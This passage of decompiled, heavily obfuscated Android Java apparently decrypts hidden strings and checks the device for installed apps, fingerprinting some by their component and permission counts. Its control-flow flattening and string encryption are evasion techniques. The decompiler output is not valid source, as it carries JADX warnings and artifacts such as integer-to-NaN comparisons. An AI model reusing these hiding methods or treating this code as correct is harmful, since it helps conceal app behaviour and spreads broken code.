                    i8 = 1565752577;
                case 373627814:
                    break;
                case 975213712:
                    int length5 = bArr4.length;
                    int i40 = 0 - i7;
                    int length6 = bArr4.length;
                    int i41 = ~i40;
                    byte b8 = bArr4[((length6 | i40) - (((-656070458) & i41) & length6)) + ((i40 | (-656070458)) & length6)];
                    int length7 = bArr4.length;
                    byte b9 = bArr3[(length7 ^ i41) + ((length7 | i40) * 2) + 1];
                    bArr4[((length5 | i40) * 2) - (length5 ^ i40)] = (byte) (((byte) (b9 - b8)) + ((byte) (((byte) 2) * ((byte) ((~b9) & b8)))));
                    i5 = (~i7) + (i7 * 2);
                    int i42 = ((i7 > 2 ? 1 : (i7 == 2 ? 0 : -1)) >>> 31) & 1;
                    if (i42 != 0) {
                        i13 = 986083301;
                    }
                    if (i42 != 0) {
                        i8 = i13;
                    } else {
                        i8 = -1138188205;
                    }
                case 1548321255:
                    int length8 = bArr.length;
                    int length9 = 0 - (0 - (bArr.length % 4));
                    if ((length8 & (~length9)) - ((~length8) & length9) <= 0) {
                        i8 = 1621215041;
                    } else {
                        i8 = 1910359311;
                    }
                    bArr3 = bArr2;
                    bArr4 = bArr;
                    i6 = i4;
                default:
                    i8 = i13;
            }
            return;
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x003f. Please report as an issue. */
    public static void z(byte[] bArr, byte[] bArr2) {
        byte[] bArr3 = null;
        int i = 0;
        int i3 = 0;
        int i4 = 0;
        int i5 = -894652659;
        byte[] bArr4 = null;
        while (true) {
            int i6 = ((i5 & 16777216) * (i5 | 16777216)) + ((i5 & (-16777217)) * ((~i5) & 16777216));
            int i7 = i5 >>> 8;
            int i8 = (i7 + i6) - (i7 & i6);
            int i9 = (i8 ^ 1458005263) + ((i8 & 1458005263) * 2);
            int i10 = 145880015;
            int i11 = 1298988808;
            boolean z3 = true;
            switch ((i9 - 1434379843) + (((~i9) & 1434379843) * 2)) {
                case -1970406716:
                    int length = bArr4.length;
                    int i12 = 0 - i;
                    int i13 = ~i12;
                    int i14 = ((length | i12) - ((602749225 & i13) & length)) + ((i12 | 602749225) & length);
                    byte b4 = bArr3[i14];
                    int length2 = bArr4.length;
                    byte b5 = bArr3[(length2 ^ i13) + ((i12 | length2) * 2) + 1];
                    int i15 = ((byte) 0) - b4;
                    bArr3[i14] = (byte) (((byte) (((byte) 2) * ((byte) (b5 & (~i15))))) - ((byte) (b5 ^ i15)));
                    i5 = -34715366;
                case -1882653318:
                    int i16 = (i3 - 1) - (i3 | (-4));
                    byte b6 = bArr3[i16];
                    int i17 = ((b6 & ForkServer.DONE) * (b6 | ForkServer.DONE)) + ((b6 & ForkServer.ERROR) * ((~b6) & 16777216));
                    int i18 = i3 + 3 + (((-1) - i3) | (-3));
                    int i19 = bArr3[i18] & ForkServer.ERROR;
                    int i20 = i19 * ((~i19) & 65536);
                    int i21 = ~((i17 | ((~i20) | 1169991170)) - ((i20 & 1169991170) | i17));
                    int a2 = j3.a(689061172 & i3, i3, 1, 689061173 & i3);
                    int i22 = bArr3[a2] & ForkServer.ERROR;
                    int i23 = ((~i21) & (i22 * ((~i22) & UserVerificationMethods.USER_VERIFY_HANDPRINT))) + i21;
                    int i24 = (i23 - 1) - ((~(bArr3[i3] & ForkServer.ERROR)) | i23);
                    byte b7 = bArr4[i16];
                    int i25 = ((b7 & ForkServer.DONE) * (b7 | ForkServer.DONE)) + ((b7 & ForkServer.ERROR) * ((~b7) & 16777216));
                    int i26 = bArr4[i18] & ForkServer.ERROR;
                    int i27 = i26 * ((~i26) & 65536);
                    int i28 = ~((i25 | ((~i27) | (-445685625))) - ((i27 & (-445685625)) | i25));
                    int i29 = bArr4[a2] & ForkServer.ERROR;
                    int i30 = i29 * ((~i29) & UserVerificationMethods.USER_VERIFY_HANDPRINT);
                    int i31 = (i30 + i28) - (i30 & i28);
                    int i32 = bArr4[i3] & ForkServer.ERROR;
                    int i33 = (i31 & (~i32)) + i32;
                    int i34 = i24 << ((i24 > Double.NaN ? 1 : (i24 == Double.NaN ? 0 : -1)) >>> 31);
                    int i35 = (i34 + i33) - ((i34 & i33) * 2);
                    int i36 = 659933421 - ((i35 & 2) | ((-1983400303) - i35));
                    bArr4[i3] = (byte) i36;
                    bArr4[a2] = (byte) (i36 >>> 8);
                    bArr4[i18] = (byte) (i36 >>> 16);
                    bArr4[i16] = (byte) (i36 >>> 24);
                    i3 = (i3 ^ 4) + ((i3 & 4) * 2);
                    int length3 = bArr4.length;
                    int length4 = 0 - (bArr4.length % 4);
                    int i37 = ((i3 > ((length3 ^ length4) + ((length3 & length4) * 2)) ? 1 : (i3 == ((length3 ^ length4) + ((length3 & length4) * 2)) ? 0 : -1)) >>> 31) & 1;
                    if (i37 != 0) {
                        i10 = 196573321;
                    }
                    if (i37 != 0) {
                        i5 = -826922365;
                    } else {
                        i5 = i10;
                    }
                case -625567707:
                    break;
                case 172635213:
                    int length5 = bArr4.length;
                    int i38 = 0 - i4;
                    if ((bArr3[(length5 ^ i38) + ((length5 & i38) * 2)] > Double.NaN ? 1 : (bArr3[(length5 ^ i38) + ((length5 & i38) * 2)] == Double.NaN ? 0 : -1)) <= -1) {
                        i5 = 196573321;
                    } else {
                        i5 = -34715366;
                    }
                    i = i4;
                case 614184219:
                    int length6 = bArr4.length;
                    int i39 = 0 - i;
                    int i40 = i39 * 3;
                    int a4 = D1.a(i39, length6);
                    int length7 = bArr4.length;
                    byte b8 = bArr4[(length7 ^ i39) + ((length7 & i39) * 2)];
                    int length8 = bArr4.length;
                    int i41 = 0 - i39;
                    byte b9 = bArr3[(((~i41) & length8) * 2) - (length8 ^ i41)];
                    bArr4[AbstractC0014b1.a((length6 & 2) | a4, i40)] = (byte) (((byte) (b9 + b8)) - ((byte) (((byte) 2) * ((byte) (b9 & b8)))));
                    i4 = ((-338014207) | i) + (338014206 | i);
                    int i42 = ((i > 2 ? 1 : (i == 2 ? 0 : -1)) >>> 31) & 1;
                    if (i42 != 0) {
                        i11 = 196573321;
                    }
                    if (i42 == 0) {
                        i5 = i11;
                    } else {
                        i5 = -518432968;
                    }
                case 835516413:
                    int length9 = bArr.length;
                    int length10 = 0 - (0 - (bArr.length % 4));
                    if ((length9 ^ length10) - (((~length9) & length10) * 2) <= 0) {
                        z3 = false;
                    }
                    if (z3) {
                        i10 = 196573321;
                    }
                    if (z3) {
                        i5 = -826922365;
                    } else {
                        i5 = i10;
                    }
                    bArr3 = bArr2;
                    bArr4 = bArr;
                    i3 = 0;
                case 1888416065:
                    i4 = bArr4.length % 4;
                    int i43 = ((i4 > 1 ? 1 : (i4 == 1 ? 0 : -1)) >>> 31) & 1;
                    if (i43 != 0) {
                        i11 = 196573321;
                    }
                    if (i43 == 0) {
                        i5 = i11;
                    } else {
                        i5 = -518432968;
                    }
                default:
                    i5 = 196573321;
            }
            return;
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0065. Please report as an issue. */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r16v0 */
    /* JADX WARN: Type inference failed for: r16v1, types: [boolean] */
    /* JADX WARN: Type inference failed for: r16v17 */
    /* JADX WARN: Type inference failed for: r16v18 */
    /* JADX WARN: Type inference failed for: r16v19 */
    /* JADX WARN: Type inference failed for: r16v2 */
    /* JADX WARN: Type inference failed for: r16v20 */
    /* JADX WARN: Type inference failed for: r16v6 */
    /* JADX WARN: Type inference failed for: r16v7 */
    /* JADX WARN: Type inference failed for: r16v8 */
    /* JADX WARN: Type inference failed for: r16v9 */
    public final boolean C(Context context) {
        String str;
        C0017c0 c0017c0;
        String str2;
        boolean z3;
        char c4;
        boolean z4;
        String str3;
        C0017c0 c0017c02;
        String str4;
        int i = 0;
        C0017c0 c0017c03 = null;
        ?? r16 = 0;
        String[] strArr = new String[0];
        String str5 = null;
        C0017c0 c0017c04 = null;
        String str6 = null;
        C0017c0 c0017c05 = null;
        String str7 = null;
        String str8 = null;
        C0017c0 c0017c06 = null;
        String str9 = null;
        String str10 = null;
        String str11 = null;
        char c5 = 59615;
        int i3 = 0;
        String str12 = null;
        while (true) {
            C0017c0 c0017c07 = c0017c04;
            switch (c5) {
                case 24522:
                    c0017c03.t(str12, str5);
                    return true;
                case 28995:
                    String str13 = str6;
                    boolean z5 = r16 == true ? 1 : 0;
                    byte[] bArr = {15, -48, 51, 54};
                    v(bArr, new byte[]{-57, -49, -48, -3, 72, -68, -31, 4});
                    str10 = new String(bArr, StandardCharsets.UTF_8).intern();
                    c5 = 1555;
                    c0017c04 = c0017c07;
                    c0017c06 = c0017c04;
                    str6 = str13;
                    str9 = str6;
                    c0017c05 = c0017c05;
                case 40684:
                    int i4 = r16 == true ? 1 : 0;
                    String[] strArr2 = V.f396g;
                    i3 = strArr2.length;
                    strArr = strArr2;
                    i = i4;
                    r16 = i;
                    c5 = 23502;
                    c0017c04 = c0017c07;
                case 26678:
                    str5 = str8;
                    c5 = 24522;
                    c0017c04 = c0017c07;
                    c0017c03 = c0017c05;
                    c0017c05 = c0017c03;
                    str12 = str7;
                    str7 = str12;
                case 36401:
                    str10 = str8;
                    c5 = 1555;
                    c0017c04 = c0017c07;
                    c0017c06 = c0017c04;
                    str9 = str6;
                case 1555:
                    c0017c06.p(str9, str10);
                    return true;
                case 23502:
                    str = str6;
                    c0017c0 = c0017c05;
                    str2 = str7;
                    z3 = r16 == true ? 1 : 0;
                    if (i < i3) {
                        c4 = 46567;
                        z4 = z3;
                        str6 = str;
                        c0017c05 = c0017c0;
                        str7 = str2;
                        c5 = c4;
                        r16 = z4;
                        c0017c04 = c0017c07;
                    }
                    c4 = 768;
                    z4 = z3;
                    str6 = str;
                    c0017c05 = c0017c0;
                    str7 = str2;
                    c5 = c4;
                    r16 = z4;
                    c0017c04 = c0017c07;
                case 58131:
                    boolean z6 = r16 == true ? 1 : 0;
                    str6 = str11;
                    c5 = 28995;
                    c0017c04 = this;
                case 51296:
                    boolean z7 = r16 == true ? 1 : 0;
                    c4 = 17516;
                    c0017c05 = this;
                    str7 = str11;
                    z4 = r16;
                    c5 = c4;
                    r16 = z4;
                    c0017c04 = c0017c07;
                case 768:
                    String[] strArr3 = V.f395f;
                    i3 = strArr3.length;
                    strArr = strArr3;
                    i = B0.a(-1, 0);
                    r16 = 0;
                    c5 = 5555;
                    c0017c04 = c0017c07;
                    str6 = str6;
                case 17516:
                    C0017c0 c0017c08 = c0017c05;
                    byte[] bArr2 = {-31, 21, -9, -36};
                    long j2 = -1;
                    long j3 = 0;
                    long j4 = ((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + ((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j5 = (j4 >>> 48) & 21845;
                    long j6 = ((j5 >>> 1) | j5) & 858993459;
                    long j7 = ((j6 >>> 2) | j6) & 252645135;
                    long j8 = (j4 >>> 32) & 21845;
                    long j9 = ((j8 >>> 1) | j8) & 858993459;
                    long j10 = ((j9 >>> 2) | j9) & 252645135;
                    long j11 = ((((j10 >>> 4) | j10) & 16711935) << 16) | ((((j7 >>> 4) | j7) & 16711935) << 24);
                    long j12 = (j4 >>> 16) & 21845;
                    long j13 = ((j12 >>> 1) | j12) & 858993459;
                    long j14 = ((j13 >>> 2) | j13) & 252645135;
                    long j15 = j4 & 21845;
                    long j16 = ((j15 >>> 1) | j15) & 858993459;
                    long j17 = ((j16 >>> 2) | j16) & 252645135;
                    int i5 = (int) ((((j17 >>> 4) | j17) & 16711935) | ((((j14 >>> 4) | j14) & 16711935) << 8) | j11);
                    long j18 = -2007754518;
                    long j19 = i5;
                    long j20 = (((((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((j19 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j19 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j19 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j19 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + 6148914691236517205L;
                    long j21 = (j20 >>> 48) & 43690;
                    long j22 = ((j21 >>> 2) | (j21 >>> 1)) & 858993459;
                    long j23 = ((j22 >>> 2) | j22) & 252645135;
                    long j24 = (j20 >>> 32) & 43690;
                    long j25 = ((j24 >>> 2) | (j24 >>> 1)) & 858993459;
                    long j26 = ((j25 >>> 2) | j25) & 252645135;
                    long j27 = ((((j26 >>> 4) | j26) & 16711935) << 16) + ((((j23 >>> 4) | j23) & 16711935) << 24);
                    long j28 = (j20 >>> 16) & 43690;
                    long j29 = ((j28 >>> 2) | (j28 >>> 1)) & 858993459;
                    long j30 = ((j29 >>> 2) | j29) & 252645135;
                    long j31 = j20 & 43690;
                    long j32 = ((j31 >>> 2) | (j31 >>> 1)) & 858993459;
                    long j33 = ((j32 >>> 2) | j32) & 252645135;
                    byte[] bArr3 = new byte[((((int) ((((j33 >>> 4) | j33) & 16711935) + (((((j30 >>> 4) | j30) & 16711935) << 8) | j27))) & 185282660) + 337641736) ^ 522924388];
                    bArr3[0] = -15;
                    bArr3[1] = 113;
                    bArr3[2] = 28;
                    bArr3[3] = 90;
                    long j34 = 545343494;
                    long j35 = 0;
                    long b4 = c3.b((((((((j34 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j34 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j34 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j34 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), ((((((((j35 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j35 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j35 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j35 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), 6148914691236517205L);
                    long j36 = (b4 >>> 48) & 43690;
                    long j37 = ((j36 >>> 2) | (j36 >>> 1)) & 858993459;
                    long j38 = ((j37 >>> 2) | j37) & 252645135;
                    long j39 = (b4 >>> 32) & 43690;
                    long j40 = ((j39 >>> 2) | (j39 >>> 1)) & 858993459;
                    long j41 = ((j40 >>> 2) | j40) & 252645135;
                    long j42 = ((((j41 >>> 4) | j41) & 16711935) << 16) | ((((j38 >>> 4) | j38) & 16711935) << 24);
                    long j43 = (b4 >>> 16) & 43690;
                    long j44 = ((j43 >>> 2) | (j43 >>> 1)) & 858993459;
                    long j45 = ((j44 >>> 2) | j44) & 252645135;
                    long j46 = b4 & 43690;
                    long j47 = ((j46 >>> 2) | (j46 >>> 1)) & 858993459;
                    long j48 = ((j47 >>> 2) | j47) & 252645135;
                    int i6 = (int) ((((j48 >>> 4) | j48) & 16711935) | ((((j45 >>> 4) | j45) & 16711935) << 8) | j42);
                    bArr3[V2.a(i6, 2096225174, (~i6) - (-2096225174)) ^ (-1550881685)] = -68;
                    bArr3[5] = -97;
                    bArr3[6] = -111;
                    bArr3[7] = 32;
                    v(bArr2, bArr3);
                    str5 = new String(bArr2, StandardCharsets.UTF_8).intern();
                    c5 = 24522;
                    c0017c04 = c0017c07;
                    str6 = str6;
                    c0017c03 = c0017c08;
                    c0017c05 = c0017c03;
                    str12 = str7;
                    str7 = str12;
                    r16 = 0;
                case 54097:
                    i++;
                    c5 = 5555;
                    c0017c04 = c0017c07;
                    r16 = 0;
                case 38460:
                    str3 = str6;
                    c0017c02 = c0017c05;
                    str4 = str7;
                    str8 = strArr[i];
                    if (I2.b(context, str8) != null) {
                        c5 = 51296;
                    } else {
                        c5 = 54097;
                    }
                    c0017c04 = c0017c07;
                    str6 = str3;
                    c0017c05 = c0017c02;
                    str7 = str4;
                    r16 = 0;
                case 46567:
                    str3 = str6;
                    c0017c02 = c0017c05;
                    str4 = str7;
                    str8 = strArr[i];
                    if (I2.b(context, str8) != null) {
                        c5 = 58131;
                    } else {
                        c5 = 630;
                    }
                    c0017c04 = c0017c07;
                    str6 = str3;
                    c0017c05 = c0017c02;
                    str7 = str4;
                    r16 = 0;
                case 630:
                    i++;
                    c5 = 23502;
                    c0017c04 = c0017c07;
                    r16 = 0;
                case 59615:
                    byte[] bArr4 = new byte[27];
                    bArr4[r16 == true ? 1 : 0] = 57;
                    str = str6;
                    c0017c0 = c0017c05;
                    long j49 = -1;
                    long j50 = r16 == true ? 1 : 0;
                    long j51 = ((((((((j49 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j49 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j49 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j49 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j50 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j50 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j50 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j50 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                    long j52 = (j51 >>> 48) & 21845;
                    long j53 = ((j52 >>> 1) | j52) & 858993459;
                    long j54 = ((j53 >>> 2) | j53) & 252645135;
                    long j55 = (j51 >>> 32) & 21845;
                    long j56 = ((j55 >>> 1) | j55) & 858993459;
                    long j57 = ((j56 >>> 2) | j56) & 252645135;
                    long j58 = ((((j57 >>> 4) | j57) & 16711935) << 16) + ((((j54 >>> 4) | j54) & 16711935) << 24);
                    long j59 = (j51 >>> 16) & 21845;
                    long j60 = ((j59 >>> 1) | j59) & 858993459;
                    long j61 = ((j60 >>> 2) | j60) & 252645135;
                    long j62 = j51 & 21845;
                    long j63 = ((j62 >>> 1) | j62) & 858993459;
                    long j64 = ((j63 >>> 2) | j63) & 252645135;
                    bArr4[1] = (((((int) ((((j64 >>> 4) | j64) & 16711935) + (((((j61 >>> 4) | j61) & 16711935) << 8) + j58))) | 336631781) & 806699072) + 134217752) ^ 940916836;
                    bArr4[2] = 39;
                    bArr4[3] = 8;
                    bArr4[4] = 26;
                    bArr4[5] = 55;
                    bArr4[6] = -103;
                    bArr4[7] = -79;
                    bArr4[8] = -66;
                    bArr4[9] = -56;
                    bArr4[10] = 32;
                    bArr4[11] = 39;
                    bArr4[12] = -114;
                    bArr4[13] = 65;
                    bArr4[14] = 35;
                    bArr4[15] = 118;
                    bArr4[16] = -48;
                    bArr4[17] = 44;
                    bArr4[18] = 32;
                    bArr4[19] = -89;
                    bArr4[20] = 109;
                    bArr4[21] = -75;
                    bArr4[22] = -62;
                    bArr4[23] = 62;
                    bArr4[24] = 92;
                    bArr4[25] = -13;
                    bArr4[26] = -110;
                    str2 = str7;
                    long j65 = 777013742;
                    long j66 = -1;
                    long j67 = (((((((((j65 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j65 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j65 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j65 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + ((((((((j66 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j66 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j66 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j66 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + 6148914691236517205L;
                    long j68 = (j67 >>> 48) & 43690;
                    long j69 = ((j68 >>> 2) | (j68 >>> 1)) & 858993459;
                    long j70 = ((j69 >>> 2) | j69) & 252645135;
                    long j71 = (j67 >>> 32) & 43690;
                    long j72 = ((j71 >>> 2) | (j71 >>> 1)) & 858993459;
                    long j73 = ((j72 >>> 2) | j72) & 252645135;
                    long j74 = ((((j73 >>> 4) | j73) & 16711935) << 16) | ((((j70 >>> 4) | j70) & 16711935) << 24);
                    long j75 = (j67 >>> 16) & 43690;
                    long j76 = ((j75 >>> 2) | (j75 >>> 1)) & 858993459;
                    long j77 = ((j76 >>> 2) | j76) & 252645135;
                    long j78 = ((((j77 >>> 4) | j77) & 16711935) << 8) | j74;
                    long j79 = j67 & 43690;
                    long j80 = ((j79 >>> 2) | (j79 >>> 1)) & 858993459;
                    long j81 = ((j80 >>> 2) | j80) & 252645135;
                    long j82 = -1979440800;
                    long j83 = (int) ((((j81 >>> 4) | j81) & 16711935) | j78);
                    long j84 = (((((((((j82 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j82 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j82 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j82 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((j83 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j83 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j83 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j83 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                    long j85 = (j84 >>> 48) & 43690;
                    long j86 = ((j85 >>> 2) | (j85 >>> 1)) & 858993459;
                    long j87 = ((j86 >>> 2) | j86) & 252645135;
                    long j88 = (j84 >>> 32) & 43690;
                    long j89 = ((j88 >>> 2) | (j88 >>> 1)) & 858993459;
                    long j90 = ((j89 >>> 2) | j89) & 252645135;
                    long j91 = ((((j90 >>> 4) | j90) & 16711935) << 16) | ((((j87 >>> 4) | j87) & 16711935) << 24);
                    long j92 = (j84 >>> 16) & 43690;
                    long j93 = ((j92 >>> 2) | (j92 >>> 1)) & 858993459;
                    long j94 = ((j93 >>> 2) | j93) & 252645135;
                    long j95 = ((((j94 >>> 4) | j94) & 16711935) << 8) + j91;
                    long j96 = j84 & 43690;
                    long j97 = ((j96 >>> 2) | (j96 >>> 1)) & 858993459;
                    long j98 = ((j97 >>> 2) | j97) & 252645135;
                    int i7 = (int) ((((j98 >>> 4) | j98) & 16711935) + j95);
                    v(bArr4, new byte[]{-75, 72, -22, 56, -47, 75, Byte.MAX_VALUE, 125, 12, -47, -62, -24, 81, 68, -12, -65, (-1962610311) ^ ((16830472 & i7) + (i7 | 16830472)), 105, -37, 103, 98, -41, 85, -51, 48, -106, -10});
                    str11 = new String(bArr4, StandardCharsets.UTF_8).intern();
                    z3 = false;
                    c4 = 768;
                    z4 = z3;
                    str6 = str;
                    c0017c05 = c0017c0;
                    str7 = str2;
                    c5 = c4;
                    r16 = z4;
                    c0017c04 = c0017c07;
                case 5555:
                    if (i < i3) {
                        c5 = 38460;
                        r16 = r16;
                    } else {
                        c5 = 41665;
                        r16 = r16;
                    }
                    c0017c04 = c0017c07;
                case 41665:
                    return r16;
                default:
                    c5 = 26678;
                    r16 = r16;
                    c0017c04 = c0017c07;
            }
        }
    }

    /* JADX WARN: Multi-variable search skipped. Vars limit reached: 6838 (expected less than 5000) */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r1v49, types: [int, boolean] */
    public final boolean D(PackageManager packageManager, String str) {
        PackageInfo packageInfo;
        ActivityInfo[] activityInfoArr;
        ServiceInfo[] serviceInfoArr;
        ActivityInfo[] activityInfoArr2;
        ProviderInfo[] providerInfoArr;
        String[] strArr;
        boolean z3 = false;
        try {
            packageInfo = packageManager.getPackageInfo(str, 4111);
        } catch (Exception unused) {
        }
        if (packageInfo == null) {
            long j2 = 1619394560;
            long j3 = 0;
            long b4 = c3.b((((((((j2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), ((((((((j3 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j3 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j3 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j3 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))), 6148914691236517205L);
            long j4 = (b4 >>> 48) & 43690;
            long j5 = ((j4 >>> 2) | (j4 >>> 1)) & 858993459;
            long j6 = ((j5 >>> 2) | j5) & 252645135;
            long j7 = (b4 >>> 32) & 43690;
            long j8 = ((j7 >>> 2) | (j7 >>> 1)) & 858993459;
            long j9 = ((j8 >>> 2) | j8) & 252645135;
            long j10 = ((((j9 >>> 4) | j9) & 16711935) << 16) + ((((j6 >>> 4) | j6) & 16711935) << 24);
            long j11 = (b4 >>> 16) & 43690;
            long j12 = ((j11 >>> 2) | (j11 >>> 1)) & 858993459;
            long j13 = ((j12 >>> 2) | j12) & 252645135;
            long j14 = b4 & 43690;
            long j15 = ((j14 >>> 2) | (j14 >>> 1)) & 858993459;
            long j16 = (j15 | (j15 >>> 2)) & 252645135;
            int i = (int) (((j16 | (j16 >>> 4)) & 16711935) + ((((j13 >>> 4) | j13) & 16711935) << 8) + j10);
            int i3 = ((-2030033338) | i) + (i & (-2030033338));
            return ((-410638778) | i3) - (i3 & (-410638778));
        }
        ApplicationInfo applicationInfo = packageInfo.applicationInfo;
        if (applicationInfo != null && (applicationInfo.flags & 1) == 0 && (activityInfoArr = packageInfo.activities) != null && (serviceInfoArr = packageInfo.services) != null && (activityInfoArr2 = packageInfo.receivers) != null && (providerInfoArr = packageInfo.providers) != null && activityInfoArr.length == 2 && ((serviceInfoArr.length == 2 || serviceInfoArr.length == 1) && activityInfoArr2.length == 1 && providerInfoArr.length == 1 && (strArr = packageInfo.requestedPermissions) != null && strArr.length >= 8)) {
            try {
                byte[] bArr = {102, -88, -64, 102, -97, -67, 113, 101, 121, 92, 0, 104, -89, -21, 91, 25, -79, -14, 79, -72, -69, 45, 78, -8, 80, 114, 24};
                long j17 = 1074858548;
                long j18 = -1;
                long j19 = (((((j18 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                long j20 = (((((((j18 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                long j21 = j20 + j19;
                long j22 = (((((((j18 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
